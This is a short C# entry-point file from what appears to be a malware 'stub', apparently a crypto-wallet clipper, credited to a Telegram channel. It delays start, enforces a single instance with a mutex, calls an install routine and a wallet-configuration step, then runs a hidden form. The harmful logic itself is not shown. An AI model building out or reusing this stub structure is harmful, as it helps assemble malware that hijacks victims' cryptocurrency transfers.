// By https://t.me/devxstudio
using Stub.Help;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stub
{
    class Program
    {
        [STAThread]
        static void Main()
        {
            Thread.Sleep(3000);
            if (!MutEx.CreateMutEx())
                Environment.Exit(0);

            Install.Run();
            Config.AddWallet();

                new Form1();
            Application.Run();
        }
    }
}
